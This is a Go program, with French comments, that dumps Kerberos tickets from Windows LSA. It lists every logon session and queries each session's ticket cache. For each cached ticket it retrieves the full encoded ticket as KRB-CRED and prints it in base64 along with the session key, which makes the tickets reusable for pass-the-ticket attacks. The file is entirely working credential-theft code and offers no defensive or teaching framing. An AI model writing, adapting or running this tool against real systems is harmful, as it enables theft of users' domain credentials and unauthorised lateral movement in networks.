package main


import (
	"fmt"
	"log"
	"math"
	"os"
	"syscall"
	"unsafe"
	"time"
	"github.com/carlpett/winlsa"
	"github.com/carlpett/winlsa/internal/lsa"
	"github.com/taskcluster/runlib/win32"
	"golang.org/x/sys/windows"
	"encoding/base64"

)

const (
	STATUS_SUCCESS                      uint32 = uint32(windows.STATUS_SUCCESS)
	DEFAULT_AUTH_PKG_ID                 uint32 = math.MaxUint32
	MICROSOFT_KERBEROS_NAME_A           string = "kerberos"
	KERB_RETRIEVE_TICKET_DEFAULT        uint32 = 0x0
	KERB_RETRIEVE_TICKET_DONT_USE_CACHE uint32 = 0x1
	KERB_RETRIEVE_TICKET_AS_KERB_CRED   uint32 = 0x8
	KerbRetrieveEncodedTicketMessage    uint32 = 8
	KerbForwardable                     uint32 = 1073741824
	KerbForwarded                       uint32 = 536870912
	KerbRenewable                       uint32 = 8388608
	KerbPre_authent                     uint32 = 2097152
	ticketFlags                         uint32 = KerbForwardable | KerbForwarded | KerbRenewable | KerbPre_authent
)

func main() {

	h := syscall.Handle(0)
	err := win32.LsaConnectUntrusted(&h)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Handle: %v", h)
	authPackage := uint32(0)
	err = win32.LsaLookupAuthenticationPackage(h, &win32.MICROSOFT_KERBEROS_NAME_A, &authPackage)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Auth package: %v", authPackage)

	luids, err := winlsa.GetLogonSessions()
	if err != nil {
		fmt.Println("GetLogonSessions:", err)
		os.Exit(1)
	}

	for _, luid := range luids {

		sd, err := winlsa.GetLogonSessionData(&luid)
		if err != nil {
			fmt.Println("LsaGetLogonSessionData:", err)
			os.Exit(1)
		}

		krbTmp := make([]byte, int(unsafe.Sizeof(lsa.KERB_QUERY_TKT_CACHE_REQUEST{})))

		siz := uint32(unsafe.Sizeof(lsa.KERB_QUERY_TKT_CACHE_REQUEST{}))

		ticketCacheRequest := (*lsa.KERB_QUERY_TKT_CACHE_REQUEST)(unsafe.Pointer(&krbTmp[0]))
		ticketCacheRequest.MessageType = lsa.KerbQueryTicketCacheExMessage
		ticketCacheRequest.LogonId = sd.LogonId
		protocolSubmitBuffer := uintptr(unsafe.Pointer(ticketCacheRequest))

		responseLenTemp := uint32(math.MaxUint32 - 20000)
		var responseLen = &responseLenTemp
		var protocolReturnBuffer uintptr
		var protocolStatus windows.NTStatus

		
		_, NTStatus := lsa.LsaCallAuthenticationPackage(h, authPackage, protocolSubmitBuffer, siz, &protocolReturnBuffer, &responseLen, &protocolStatus)
		if NTStatus == STATUS_SUCCESS && 0 != protocolReturnBuffer {

			var ticketCacheResponse lsa.KERB_QUERY_TKT_CACHE_RESPONSE
			ticketCacheResponse = *(*lsa.KERB_QUERY_TKT_CACHE_RESPONSE)(unsafe.Pointer(protocolReturnBuffer))
			count2 := ticketCacheResponse.CountOfTickets

			if count2 != 0 {
				fmt.Printf("-----------------------------------------BEGIN FOR USER "+sd.UserName+"--------------------------------------------------\n\n")
				fmt.Printf("  UserName                 : %s\n", sd.UserName);
		        fmt.Printf("  Domain                   : %s\n", sd.LogonDomain);
		        fmt.Printf("  LogonId                  : %v\n", sd.LogonId);
		        fmt.Printf("  UserSID                  : %v\n", sd.Sid);
		        fmt.Printf("  AuthenticationPackage    : %s\n", sd.AuthenticationPackage);
		        fmt.Printf("  LogonType                : %s\n", sd.LogonType);
		        fmt.Printf("  LogonTime                : %s\n",sd.LogonTime);
		        fmt.Printf("  LogonServer              : %s\n", sd.LogonServer);
		        fmt.Printf("  Number of tickets        : %d\n", ticketCacheResponse.CountOfTickets)
				dataSize := unsafe.Sizeof(lsa.KERB_TICKET_CACHE_INFO_EX{})
				for j := 0; j < int(count2); j++ {
					PtrTicket := uintptr(protocolReturnBuffer) + uintptr(8+j*int(dataSize))
					TempTicket := (*lsa.KERB_TICKET_CACHE_INFO_EX)(unsafe.Pointer(PtrTicket))
					if TempTicket.ServerRealm.String() != "" && TempTicket.ServerName.String() != "" {
						fmt.Printf("  [i]  Server name   %q \n", TempTicket.ServerName.String())
						fmt.Printf("  [i]  Client name   %q \n", TempTicket.ClientName.String())
						fmt.Printf("  [i]  ClientRealm   %q \n", TempTicket.ClientRealm.String())
						fmt.Printf("  [i]  ServerRealm   %q \n", TempTicket.ServerRealm.String())
						fmt.Printf("  [i]  StartTime     %q \n", fromFileTimeUtc(TempTicket.StartTime))
						fmt.Printf("  [i]  EndTime       %q \n", fromFileTimeUtc(TempTicket.EndTime))
						fmt.Printf("  [i]  RenewTime     %q \n", fromFileTimeUtc(TempTicket.RenewTime))
						fmt.Printf("  [i]  Flags          %x \n", TempTicket.TicketFlags)

						Extract(h,authPackage,sd.LogonId,TempTicket.ServerName.String(),TempTicket.TicketFlags)
						
					}
				}
				fmt.Printf("\n\n\n")
			}
			lsa.LsaFreeReturnBuffer(protocolReturnBuffer)
			lsa.LsaFreeReturnBuffer(protocolSubmitBuffer)
		}
	}
}

func fromFileTimeUtc(fileTime int64) time.Time {
	epochDiff := int64(11644473600)
	if fileTime < 0 || fileTime > 2650467743999999999 {
		return time.Time{}
	}

	// Convert to seconds by dividing by 1e7 (there are 1e7 100-nanosecond intervals per second)
	unixTime := (fileTime / 1e7) - epochDiff

	// Return as time.Time
	return time.Unix(unixTime, 0).UTC()
}

func Extract(lsaHandle syscall.Handle, authPack uint32, userLogonID windows.LUID, targetName string, ticketFlags uint32) {
	// Préparer la requête pour extraire le ticket
	TargetNamePtr := lsa.NewUnicodeString(targetName)
	request := lsa.KERB_RETRIEVE_TKT_REQUEST{
		MessageType:    lsa.KerbRetrieveEncodedTicketMessage,
		LogonId:        userLogonID,
		TargetName:     *TargetNamePtr,
		TicketFlags:    ticketFlags,
		CacheOptions:   KERB_RETRIEVE_TICKET_AS_KERB_CRED,
		EncryptionType: 0,
	}

	// Convertir la requête en bytes
	/*fmt.Println("Request:")
	fmt.Printf("  MessageType: %d\n", request.MessageType)
	fmt.Printf("  LogonId: %d-%d\n", request.LogonId.LowPart, request.LogonId.HighPart)
	fmt.Printf("  TargetName: %s\n", targetName)
	fmt.Printf("  TicketFlags: %d\n", request.TicketFlags)
	fmt.Printf("  CacheOptions: %d\n", request.CacheOptions)
	fmt.Printf("  EncryptionType: %d\n", request.EncryptionType)
	*/
	requestSize := uintptr(unsafe.Sizeof(request))
	//fmt.Println("Struct Size:", requestSize)

	newStructSize := requestSize + uintptr(TargetNamePtr.MaximumLength)

	// Allouer de la mémoire non gérée
	unmanagedAddr, err := lsa.HeapAlloc(lsa.GetProcessHeap(), 0, newStructSize)
	if unmanagedAddr == 0 || err != nil {
		log.Fatalf("HeapAlloc failed: %v", err)
	}




	// Copier la structure de la requête dans la mémoire non gérée
	CopyMemory(unsafe.Pointer(unmanagedAddr), unsafe.Pointer(&request), requestSize)

	// Définir le pointeur TargetName à la fin de KERB_RETRIEVE_TKT_REQUEST
	newTargetNameBuffPtr := unmanagedAddr + uintptr(requestSize)
	CopyMemory(unsafe.Pointer(newTargetNameBuffPtr), unsafe.Pointer(TargetNamePtr.Buffer), uintptr(TargetNamePtr.MaximumLength))

	// Mettre à jour le pointeur du buffer TargetName dans la mémoire non gérée
	if unsafe.Sizeof(uintptr(0)) == 8 {
		*(*uintptr)(unsafe.Pointer(unmanagedAddr + 24)) = newTargetNameBuffPtr
	} else {
		*(*uintptr)(unsafe.Pointer(unmanagedAddr + 16)) = newTargetNameBuffPtr
	}

	var returnBuffer uintptr
	var responseLen uint32
	var protocolStatus windows.NTStatus

	// Appeler LsaCallAuthenticationPackage pour extraire le ticket

	_, NTStatus := lsa.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, uint32(newStructSize), &returnBuffer, (**uint32)(unsafe.Pointer(&responseLen)), &protocolStatus)
	if NTStatus == STATUS_SUCCESS &&  0 != returnBuffer {

		// Convertir la réponse en structure KERB_RETRIEVE_TKT_RESPONSE
		var response lsa.KERB_RETRIEVE_TKT_RESPONSE
		response = *(*lsa.KERB_RETRIEVE_TKT_RESPONSE)(unsafe.Pointer(returnBuffer))

		encodedTicketSize := response.Ticket.EncodedTicketSize
		encodedTicket := make([]byte, encodedTicketSize)
		CopyMemory(unsafe.Pointer(&encodedTicket[0]), unsafe.Pointer(response.Ticket.EncodedTicket), uintptr(encodedTicketSize))
		encodedTicketBase64 := base64.StdEncoding.EncodeToString(encodedTicket)



		// Afficher les informations du ticket
		ticket := response.Ticket
		fmt.Println("------[+] ServiceName          : ", ticket.ServiceName.String())
		//fmt.Println("------[+] TargetName           : ", ticket.TargetName.String())
		fmt.Println("------[+] ClientName           : ", ticket.ClientName.String())
		fmt.Println("------[+] DomainName           : ", ticket.DomainName.String())
		fmt.Println("------[+] TargetDomainName     : ", ticket.TargetDomainName.String())
		fmt.Println("------[+] AltTargetDomainName  : ", ticket.AltTargetDomainName.String())
		fmt.Println("------[+] SessionKey           : ", response.Ticket.SessionKey.Key)
		fmt.Println("------[+] TicketFlags          : ", ticket.TicketFlags)
		fmt.Println("------[+] Flags                : ", ticket.Flags)
		fmt.Println("------[+] KeyExpirationTime    : ", fromFileTimeUtc(ticket.KeyExpirationTime))
		fmt.Println("------[+] StartTime            : ", fromFileTimeUtc(ticket.StartTime))
		fmt.Println("------[+] EndTime              : ", fromFileTimeUtc(ticket.EndTime))
		fmt.Println("------[+] RenewUntil           : ", fromFileTimeUtc(ticket.RenewUntil))
		fmt.Println("------[+] TimeSkew             : ", ticket.TimeSkew)
		fmt.Printf("------[+] EncodedTicket (Base64): \n%s\n", encodedTicketBase64)
		fmt.Printf("\n")

		// Libérer la mémoire allouée par LsaCallAuthenticationPackage
		lsa.LsaFreeReturnBuffer(returnBuffer)
		lsa.HeapFree(lsa.GetProcessHeap(), 0, unmanagedAddr)
	} 
}


func CopyMemory(dest, src unsafe.Pointer, length uintptr) {
	for i := uintptr(0); i < length; i++ {
		*(*byte)(unsafe.Pointer(uintptr(dest) + i)) = *(*byte)(unsafe.Pointer(uintptr(src) + i))
	}
}


